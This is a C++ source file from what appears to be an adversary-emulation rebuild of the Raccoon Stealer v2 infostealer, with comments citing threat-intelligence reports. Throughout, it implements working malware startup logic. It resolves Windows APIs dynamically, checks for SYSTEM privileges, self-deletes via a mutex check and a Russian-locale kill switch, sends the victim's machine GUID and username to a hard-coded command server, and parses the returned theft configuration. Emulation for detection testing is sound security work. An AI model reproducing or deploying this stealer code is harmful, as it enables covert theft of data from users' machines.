#include "startuptasks.h"

HANDLE g_hMutex;

/**
* Functions appear in order of execution, with the exeception of
* the string decrypt/decode which is over in obfuscation.cpp.
*/

/**
* Raccoon checks if it is running as SYSTEM, in which case it would enumerate processes
* We did not plan to run this as SYSTEM and as such skipped implementation of the follow-on checks.
* 
* Sources:
* - Sekoia
* - AnyRun
*/
bool isSystem() {
    HANDLE currentProc;
    HANDLE hToken;
    LPWSTR pSidString;
    PTOKEN_USER pUser = NULL;
    DWORD TokenInformationLength = 0;
    bool isSystem = false;

    // Grab the current process
    currentProc = g_racGetCurrentProcess();

    // Grab the token from the process
    if (!g_racOpenProcessToken(currentProc, TOKEN_READ, &hToken)) {
        //std:: cout << "Failed at process token" << endl;
        return false;
    }

    // Allocate the right amount of token space
    if (!g_racGetTokenInformation(hToken, TokenUser, 0, TokenInformationLength, &TokenInformationLength)
        && g_racGetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        //cout << "Failed at allocation" << endl;
        return false;
    }

    pUser = (PTOKEN_USER)g_racGlobalAlloc(0x40u, TokenInformationLength);

    // Get the token information
    if (!g_racGetTokenInformation(hToken, TokenUser, pUser, TokenInformationLength, &TokenInformationLength)) {
        //cout << "Failed at getting SID" << endl;
        return false;
    }

    // Convert to a normal string and check for admin
    if (!g_racConvertSidToStringSidW(pUser->User.Sid, &pSidString)) {
        //cout << "Failed at converting SID" << endl;
        cout << g_racGetLastError() << endl;
        return false;
    }

    if (lstrcmpiW(g_sid.c_str(), pSidString) == 0) {
        isSystem = true;
    }

    g_racGlobalFree(pUser);

    return isSystem;
}

/*
* This function first loads kernel32.dll, finds the offset of LoadLibraryW and GetProcAddress, 
* and then populates a map of the designated modules to support function resolution in
* resolveFunctionPointers().
* 
* Sources:
* - Sekoia
* - AnyRun
* - Zscaler 
*/
int loadModules(unordered_map<wstring, HMODULE>& mHandles) {

    // get loadlibrary
    HMODULE hKern32 = LoadLibraryW(L"kernel32.dll");
    if (!hKern32) return -1; //bad
    mHandles[L"Kernel32.dll"] = hKern32;
    g_racLoadLibraryW = (RacLoadLibraryW)GetProcAddress(mHandles[L"Kernel32.dll"], "LoadLibraryW"); //global g_rac* functions are declared in vars.h
    if (!g_racLoadLibraryW) return -1;
    g_racGetProcAddress = (RacGetProcAddress)GetProcAddress(mHandles[L"Kernel32.dll"], "GetProcAddress");
    if (!g_racGetProcAddress) return -1;


    // Load the needed libs (based on threat intel)
    if (loadWindowsDLLs(mHandles, L"Ole32.dll") != 0) return -1;
    if (loadWindowsDLLs(mHandles, L"WinInet.dll") != 0) return -1;
    if (loadWindowsDLLs(mHandles, L"Advapi32.dll") != 0) return -1;
    if (loadWindowsDLLs(mHandles, L"User32.dll") != 0) return -1;
    if (loadWindowsDLLs(mHandles, L"Crypt32.dll") != 0) return -1;
    if (loadWindowsDLLs(mHandles, L"Shell32.dll") != 0) return -1;
    if (loadWindowsDLLs(mHandles, L"Gdi32.dll") != 0) return -1;
    if (loadWindowsDLLs(mHandles, L"Shlwapi.dll") != 0) return -1;
    if (loadWindowsDLLs(mHandles, L"Bcrypt.dll") != 0) return -1;
    if (loadWindowsDLLs(mHandles, L"Winhttp.dll") != 0) return -1;
    if (loadWindowsDLLs(mHandles, L"Gdiplus.dll") != 0) return -1;

    return 0;
}

/*
* This function resolves all of the utilized Windows API calls in Raccoon and stores them as global vars.
* Per CTI, the function names are not obfuscated like other strings.
*
* Sources:
* - Sekoia
* - AnyRun
* - Zscaler
*/
int resolveFunctionPointers(unordered_map<wstring, HMODULE> mHandles) {
    // Assign the the function pointers
    g_racBitBlt = (RacBitBlt)g_racGetProcAddress(mHandles[L"Gdi32.dll"], "BitBlt");
    if (!g_racBitBlt) return -1;

    g_racCLSIDFromString = (RacCLSIDFromString)g_racGetProcAddress(mHandles[L"Ole32.dll"], "CLSIDFromString");
    g_racConvertSidToStringSidW = (RacConvertSidToStringSidW)g_racGetProcAddress(mHandles[L"Advapi32.dll"], "ConvertSidToStringSidW");
    g_racCreateCompatibleBitmap = (RacCreateCompatibleBitmap)g_racGetProcAddress(mHandles[L"Gdi32.dll"], "CreateCompatibleBitmap");
    g_racCreateCompatibleDC = (RacCreateCompatibleDC)g_racGetProcAddress(mHandles[L"Gdi32.dll"], "CreateCompatibleDC");
    g_racCreateMutexW = (RacCreateMutexW)g_racGetProcAddress(mHandles[L"Kernel32.dll"], "CreateMutexW");
    g_racCreateProcessW = (RacCreateProcessW)g_racGetProcAddress(mHandles[L"Kernel32.dll"], "CreateProcessW");
    g_racFindClose = (RacFindClose)g_racGetProcAddress(mHandles[L"Kernel32.dll"], "FindClose");
    g_racFindFirstFileW = (RacFindFirstFileW)g_racGetProcAddress(mHandles[L"Kernel32.dll"], "FindFirstFileW");
    g_racFindNextFileW = (RacFindNextFileW)g_racGetProcAddress(mHandles[L"Kernel32.dll"], "FindNextFileW");
    g_racGetCurrentProcess = (RacGetCurrentProcess)g_racGetProcAddress(mHandles[L"Kernel32.dll"], "GetCurrentProcess");
    g_racGetDC = (RacGetDC)g_racGetProcAddress(mHandles[L"User32.dll"], "GetDC");
    g_racGetLastError = (RacGetLastError)g_racGetProcAddress(mHandles[L"Kernel32.dll"], "GetLastError");
    g_racGetLocaleInfoW = (RacGetLocaleInfoW)g_racGetProcAddress(mHandles[L"Kernel32.dll"], "GetLocaleInfoW");
    g_racGetModuleFileNameW = (RacGetModuleFileNameW)g_racGetProcAddress(mHandles[L"Kernel32.dll"], "GetModuleFileNameW");
    g_racGetSystemInfo = (RacGetSystemInfo)g_racGetProcAddress(mHandles[L"Kernel32.dll"], "GetSystemInfo");
    g_racGetSystemMetrics = (RacGetSystemMetrics)g_racGetProcAddress(mHandles[L"User32.dll"], "GetSystemMetrics");
    g_racGetTimeZoneInformation = (RacGetTimeZoneInformation)g_racGetProcAddress(mHandles[L"Kernel32.dll"], "GetTimeZoneInformation");
    g_racGetTokenInformation = (RacGetTokenInformation)g_racGetProcAddress(mHandles[L"Advapi32.dll"], "GetTokenInformation");
    g_racGetUserDefaultLCID = (RacGetUserDefaultLCID)g_racGetProcAddress(mHandles[L"Kernel32.dll"], "GetUserDefaultLCID");
    g_racGetUserDefaultLocaleName = (RacGetUserDefaultLocaleName)g_racGetProcAddress(mHandles[L"Kernel32.dll"], "GetUserDefaultLocaleName");
    g_racGlobalAlloc = (RacGlobalAlloc)g_racGetProcAddress(mHandles[L"Kernel32.dll"], "GlobalAlloc");
    g_racGlobalFree = (RacGlobalFree)g_racGetProcAddress(mHandles[L"Kernel32.dll"], "GlobalFree");
    g_racGlobalMemoryStatusEx = (RacGlobalMemoryStatusEx)g_racGetProcAddress(mHandles[L"Kernel32.dll"], "GlobalMemoryStatusEx");
    g_racLocalAlloc = (RacLocalAlloc)g_racGetProcAddress(mHandles[L"Kernel32.dll"], "LocalAlloc");
    g_racLocalFree = (RacLocalFree)g_racGetProcAddress(mHandles[L"Kernel32.dll"], "LocalFree");
    g_racLookupAccountNameW = (RacLookupAccountNameW)g_racGetProcAddress(mHandles[L"Advapi32.dll"], "LookupAccountNameW");
    g_racOpenMutexW = (RacOpenMutexW)g_racGetProcAddress(mHandles[L"Kernel32.dll"], "OpenMutexW");
    g_racRegCloseKey = (RacRegCloseKey)g_racGetProcAddress(mHandles[L"Advapi32.dll"], "RegCloseKey");
    g_racRegEnumKeyExW = (RacRegEnumKeyExW)g_racGetProcAddress(mHandles[L"Advapi32.dll"], "RegEnumKeyExW");
    g_racRegQueryValueExW = (RacRegQueryValueExW)g_racGetProcAddress(mHandles[L"Advapi32.dll"], "RegQueryValueExW");
    g_racReleaseMutex = (RacReleaseMutex)g_racGetProcAddress(mHandles[L"Kernel32.dll"], "ReleaseMutex");
    g_racSelectObject = (RacSelectObject)g_racGetProcAddress(mHandles[L"Gdi32.dll"], "SelectObject");
    g_racSHGetKnownFolderPath = (RacSHGetKnownFolderPath)g_racGetProcAddress(mHandles[L"Shell32.dll"], "SHGetKnownFolderPath");
    g_racStrStrIW = (RacStrStrIW)g_racGetProcAddress(mHandles[L"Shlwapi.dll"], "StrStrIW");
    g_racDeleteObject = (RacDeleteObject)g_racGetProcAddress(mHandles[L"Gdi32.dll"], "DeleteObject");
    g_racDeleteDC = (RacDeleteDC)g_racGetProcAddress(mHandles[L"Gdi32.dll"], "DeleteDC");
    g_racReleaseDC = (RacReleaseDC)g_racGetProcAddress(mHandles[L"User32.dll"], "ReleaseDC");
    g_racOpenProcessToken = (RacOpenProcessToken)g_racGetProcAddress(mHandles[L"Advapi32.dll"], "OpenProcessToken");
    g_racRegOpenKeyExW = (RacRegOpenKeyExW)g_racGetProcAddress(mHandles[L"Advapi32.dll"], "RegOpenKeyExW");
    g_racCryptStringToBinaryA = (RacCryptStringToBinaryA)g_racGetProcAddress(mHandles[L"Crypt32.dll"], "CryptStringToBinaryA");
    g_racDeleteFileW = (RacDeleteFileW)g_racGetProcAddress(mHandles[L"Kernel32.dll"], "DeleteFileW");
    g_racFreeLibrary = (RacFreeLibrary)g_racGetProcAddress(mHandles[L"Kernel32.dll"], "FreeLibrary");
    g_racUnmapViewOfFile = (RacUnmapViewOfFile)g_racGetProcAddress(mHandles[L"Kernel32.dll"], "UnmapViewOfFile");
    g_racBCryptOpenAlgorithmProvider = (RacBCryptOpenAlgorithmProvider)g_racGetProcAddress(mHandles[L"Bcrypt.dll"], "BCryptOpenAlgorithmProvider");
    g_racBCryptCloseAlgorithmProvider = (RacBCryptCloseAlgorithmProvider)g_racGetProcAddress(mHandles[L"Bcrypt.dll"], "BCryptCloseAlgorithmProvider");
    g_racCryptUnprotectData = (RacCryptUnprotectData)g_racGetProcAddress(mHandles[L"Crypt32.dll"], "CryptUnprotectData");
    g_racBCryptSetProperty = (RacBCryptSetProperty)g_racGetProcAddress(mHandles[L"Bcrypt.dll"], "BCryptSetProperty");
    g_racBCryptDecrypt = (RacBCryptDecrypt)g_racGetProcAddress(mHandles[L"Bcrypt.dll"], "BCryptDecrypt");
    g_racBCryptGenerateSymmetricKey = (RacBCryptGenerateSymmetricKey)g_racGetProcAddress(mHandles[L"Bcrypt.dll"], "BCryptGenerateSymmetricKey");
    g_racWinHttpOpen = (RacWinHttpOpen)g_racGetProcAddress(mHandles[L"Winhttp.dll"], "WinHttpOpen");
    g_racWinHttpConnect = (RacWinHttpConnect)g_racGetProcAddress(mHandles[L"Winhttp.dll"], "WinHttpConnect");
    g_racWinHttpOpenRequest = (RacWinHttpOpenRequest)g_racGetProcAddress(mHandles[L"Winhttp.dll"], "WinHttpOpenRequest");
    g_racWinHttpAddRequestHeaders = (RacWinHttpAddRequestHeaders)g_racGetProcAddress(mHandles[L"Winhttp.dll"], "WinHttpAddRequestHeaders");
    g_racWinHttpSendRequest = (RacWinHttpSendRequest)g_racGetProcAddress(mHandles[L"Winhttp.dll"], "WinHttpSendRequest");
    g_racWinHttpReceiveResponse = (RacWinHttpReceiveResponse)g_racGetProcAddress(mHandles[L"Winhttp.dll"], "WinHttpReceiveResponse");
    g_racWinHttpQueryHeaders = (RacWinHttpQueryHeaders)g_racGetProcAddress(mHandles[L"Winhttp.dll"], "WinHttpQueryHeaders");
    g_racWinHttpQueryDataAvailable = (RacWinHttpQueryDataAvailable)g_racGetProcAddress(mHandles[L"Winhttp.dll"], "WinHttpQueryDataAvailable");
    g_racWinHttpReadData = (RacWinHttpReadData)g_racGetProcAddress(mHandles[L"Winhttp.dll"], "WinHttpReadData");
    g_racWinHttpCloseHandle = (RacWinHttpCloseHandle)g_racGetProcAddress(mHandles[L"Winhttp.dll"], "WinHttpCloseHandle");
    g_racGetUserNameW = (RacGetUserNameW)g_racGetProcAddress(mHandles[L"Advapi32.dll"], "GetUserNameW");
    g_racRemoveDirectoryW = (RacRemoveDirectoryW)g_racGetProcAddress(mHandles[L"Kernel32.dll"], "RemoveDirectoryW");
    g_racGetSystemWow64DirectoryW = (RacGetSystemWow64DirectoryW)g_racGetProcAddress(mHandles[L"Kernel32.dll"], "GetSystemWow64DirectoryW");
    g_racGdiplusStartup = (RacGdiplusStartup)g_racGetProcAddress(mHandles[L"Gdiplus.dll"], "GdiplusStartup");
    g_racGdiplusShutdown = (RacGdiplusShutdown)g_racGetProcAddress(mHandles[L"Gdiplus.dll"], "GdiplusShutdown");
    g_racEnumDisplayDevicesW = (RacEnumDisplayDevicesW)g_racGetProcAddress(mHandles[L"User32.dll"], "EnumDisplayDevicesW");

    return 0;
}


/**
* Checks if the hard-coded mutex value exists. If it exists, calls self-delete; otherwise
* it creates the mutex based on a hard-coded string per CTI
* 
* Sources:
* - AnyRun
* - Sekoia
* - Infosec Writeup
* - Zscaler
* 
*/
int createMutex() {
    
    g_hMutex = g_racOpenMutexW(MUTEX_ALL_ACCESS, 0, g_mutexValue.c_str());

    if (g_hMutex == NULL) {
        g_hMutex = g_racCreateMutexW(0, 0, g_mutexValue.c_str());
    }
    else {
        initiateSelfDelete();
        return 1;
    }

    return 0;
}

/**
* Obtains the user locale with GetUserDefaultLocaleName. Terminates the program
* if the locale = ru per threat intelligence.
* 
* Sources:
* - AnyRun
*/
int checkLocale() {
    wchar_t userLocaleName[85];
    int res;
    wstring russianLocale = g_ru_lang;

    res = g_racGetUserDefaultLocaleName(userLocaleName, 85);

    if (res != 0) {
        PCWSTR compRes;
        compRes = g_racStrStrIW(userLocaleName, russianLocale.c_str());
        if (compRes != NULL) {
            initiateSelfDelete();
        }
    }

    return 0;
}

/**
* This function gathers the machine GUID, username and combines it into a formatted string
* along with the RC4 key which gets sent to the server to obtain the configuration file.
* 
* Sources:
* - Sekoia
* - AnyRun
* - Zscaler 
*/
string conductInitialCheckin() {
    wstring machineGUID = getMachineGUID();
    wstring username = getUserName();
    wstring preamble = g_checkin_machineID;
    wstring pipeChar = g_pipe;
    wstring configString = g_checkin_configID;

    wstring postString = preamble + machineGUID.c_str() + pipeChar + username + configString + g_C2RC4Key;
    wstring headers = g_checkin_headers;

    vector<char> requestData;
    appendWStringToVector(requestData, postString);

    // Header source: https://darktrace.com/blog/the-resurgence-of-the-raccoon-steps-of-a-raccoon-stealer-v2-infection-part-2
    vector<char> response = sendRequest(g_POST.c_str(), requestData, headers, g_port, g_server, L"");
    string s(response.begin(), response.end());

    return s;

}

/**
* Parses the returned configuration lines to the best extent possible based on threat intelligence.
* Not all of these configuration details were available.
* 
* Sources:
* - CyberInt
* - AnyRun
*/
int parseConfig(unordered_map<wstring, vector<wstring>>& config, string rawConfig) {
    istringstream f(rawConfig);
    string line;
    string delimiter = ":"; // this function uses this delim to split on the first instance only

    while (std::getline(f, line)) {
        smatch match;
        wstring key;

        // Handle libs_
        if (regex_match(line, match, regex(string(g_config_libs_regex.begin(), g_config_libs_regex.end())))) {
            key = g_config_libs;
        } // Handle grbr_
        else if (regex_match(line, match, regex(string(g_config_grbr_regex.begin(), g_config_grbr_regex.end())))) {
            key = g_config_grbr;
        } // Handle scrnsht_
        else if (regex_match(line, match, regex(string(g_config_scrnsht_regex.begin(), g_config_scrnsht_regex.end())))) {
            key = g_config_scrnsht;
        } // Handle token
        else if (regex_match(line, match, regex(string(g_config_token_regex.begin(), g_config_token_regex.end())))) {
            key = g_config_token;
        }
        else { return -1; } // panic

        // Now we actualy do the needful
        string subConf = line.substr(line.find(delimiter) + 1); // substring the config line
        if (config.find(key) != config.end()) { // if the key exists
            config[key].push_back(wstring(subConf.begin(), subConf.end())); // add the vital bits of the config line to the appropriately key'd vector
        }
        else { // if the key doesn't exist
            vector<wstring> vec;
            vec.push_back(wstring(subConf.begin(), subConf.end())); // create new vector with config line
            config[key] = vec; // set new config hashmap entry
        }
    }
    return 0;
}

/**
* Sets the global var for LocalLow if it can be found, otherwise
* leaves the global default of c:\temp
* 
* Sources:
* - Inferred capability from example configuration
* 
*/
void setFolderPath() {
    // Grab the LocalLow folder 
    LPWSTR localLowTemp;
    HRESULT status;

    status = g_racSHGetKnownFolderPath(FOLDERID_LocalAppDataLow, 0, 0, &localLowTemp);

    if (status == S_OK)
        g_localLowPath = wstring(localLowTemp);
}


